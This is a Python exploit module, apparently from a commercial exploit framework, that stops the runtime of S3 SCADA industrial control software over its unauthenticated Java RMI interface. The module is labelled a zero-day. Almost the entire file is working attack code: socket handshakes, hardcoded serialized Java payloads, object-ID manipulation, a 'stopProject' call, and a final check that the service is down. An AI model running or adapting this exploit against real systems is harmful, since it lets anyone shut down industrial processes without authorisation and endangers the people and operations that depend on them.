#!/usr/bin/env python

import socket
import struct
import time
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_s3scada_remote_stop"
INFO['DESCRIPTION'] = "S3 Scada Remote Runtime Stop"
INFO['VENDOR'] = "http://s3.com.ua/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Specially crafted tcp request allows to stop scada runtime. No auth required.
Tested against S3 1.6.0.1231 on Windows 7 SP1 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://s3.com.ua/download/cat_view/26--s3.html"
INFO["LINKS"] = []
INFO['CHANGELOG']="5 Sep, 2016. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 8889

HELLO_STRING = "JRMI\x00\x02K"

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def get_port_from_resp(self, resp):
        res = resp.split("UnicastRef")[1].split("\x00\x00")[1]
        new_port = struct.unpack(">H", res[:2])[0]
        return new_port

    def get_obj_id(self, resp):
        res = resp[-24:]
        return res

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Trying to connect to {}:{}".format(self.host, self.port))
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((self.host, self.port))
        s.send(HELLO_STRING)
        s.recv(1024)

        data = "\x00\x0d192.168.1.176\x00\x00\x00\x00"
        s.send(data)

        data = "50aced00057722000000000000000000000000000000000000000000000000000244154dc9d4e63bdf7400066a6d78726d69".decode('hex')
        self.log("[*] Getting remote management port")
        s.send(data)
        recv_data = s.recv(2048)
        new_port = self.get_port_from_resp(recv_data)
        self.log("[+] Management port is %s" % new_port)
        obj_id = self.get_obj_id(recv_data)

        self.log("[*] Connecting to manager...")
        s1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((self.host, new_port))
        s1.send(HELLO_STRING)
        s1.recv(1024)

        data = "\x00\x0d192.168.1.176\x00\x00\x00\x00"
        s1.send(data)

        data_2 = "50aced000577220000000000000002000000000000000000000000000000000001f6b6898d8bf28643757200185b4c6a6176612e726d692e7365727665722e4f626a49443b871300b8d02c647e02000070787000000001737200156a6176612e726d692e7365727665722e4f626a4944a75efa128ddce55c0200024a00066f626a4e756d4c000573706163657400154c6a6176612f726d692f7365727665722f5549443b707870e685177eaaab3bdb737200136a6176612e726d692e7365727665722e5549440f12700dbf364f12020003530005636f756e744a000474696d65490006756e69717565707870800100000156f9ba5cf954bad4ea770880000000000000b4737200126a6176612e726d692e6467632e4c65617365b0b5e2660c4adc340200024a000576616c75654c0004766d69647400134c6a6176612f726d692f6467632f564d49443b70787000000000000927c0737200116a6176612e726d692e6467632e564d4944f8865bafa4a56db60200025b0004616464727400025b424c000375696471007e0003707870757200025b42acf317f8060854e002000070787000000008e93f7e1fe80b25997371007e0005800100000156f915ad49fcc0af11".decode('hex')
        s1.send(data_2)
        obj_data = s1.recv(2048)


        s.send("R")
        s.recv(1024)
        obj = obj_data[8:22]
        last_id = obj[-1]
        last_id = struct.unpack("B", last_id)[0] - 1
        last_id = struct.pack("B", last_id)
        obj = obj[:-1] + last_id
        dat = "\x54" + obj
        s.send(dat)

        data = "\x50\xac\xed\x00\x05\x77\x22" + obj_id[:-3] + "\x01\xff\xff\xff\xff\xf0\xe0\x74\xea\xad\x0c\xae\xa8\x70"
        s1.send(data)
        recv_data = s1.recv(2048)

        obj_id = self.get_obj_id(recv_data)
        data = "\x54" + obj_id[8:-3]
        last_id = struct.unpack("B", obj_id[-3:-2])[0] + 1
        last_id = struct.pack("B", last_id)
        data += last_id
        s1.send(data)

        data = "\x50\xac\xed\x00\x05\x77\x22" + obj_id[:-2] + "\xff\xff\xff\xff\xff\x0e\xbe\xc7\x7d\xc6\x53\x63"
        s1.send(data)
        s1.recv(1024)

        data = "\x50\xac\xed\x00\x05\x77\x22" + obj_id[:-2]
        data += ("\xff\xff\xff"
        "\xff\x13\xe7\xd6\x94\x17\xe5\xda\x20\x73\x72\x00\x1b\x6a\x61\x76"
        "\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x4f\x62"
        "\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b\xeb\x6d\x15\xcf"
        "\x03\x00\x00\x70\x78\x70\x74\x00\x31\x72\x74\x73\x2e\x73\x33\x2e"
        "\x73\x65\x72\x76\x69\x63\x65\x73\x2e\x6d\x62\x65\x61\x6e\x73\x2e"
        "\x48\x4d\x49\x53\x65\x72\x76\x69\x63\x65\x3a\x6e\x61\x6d\x65\x3d"
        "\x48\x4d\x49\x53\x65\x72\x76\x69\x63\x65\x78\x74\x00\x0b\x73\x74"
        "\x6f\x70\x50\x72\x6f\x6a\x65\x63\x74\x73\x72\x00\x19\x6a\x61\x76"
        "\x61\x2e\x72\x6d\x69\x2e\x4d\x61\x72\x73\x68\x61\x6c\x6c\x65\x64"
        "\x4f\x62\x6a\x65\x63\x74\x7c\xbd\x1e\x97\xed\x63\xfc\x3e\x02\x00"
        "\x03\x49\x00\x04\x68\x61\x73\x68\x5b\x00\x08\x6c\x6f\x63\x42\x79"
        "\x74\x65\x73\x74\x00\x02\x5b\x42\x5b\x00\x08\x6f\x62\x6a\x42\x79"
        "\x74\x65\x73\x71\x00\x7e\x00\x05\x70\x78\x70\x00\x00\x00\x0d\x70"
        "\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67"
        "\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47"
        "\x02\x00\x00\x70\x78\x70\x00\x00\x00\x00\x70")
        self.log("[*] Trying to stop remote runtime")
        s1.send(data)
        time.sleep(2)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((self.host, self.port))
        except:
            self.log("[+] {}:{} is unavailable".format(self.host, self.port))
            self.finish(True)
        self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
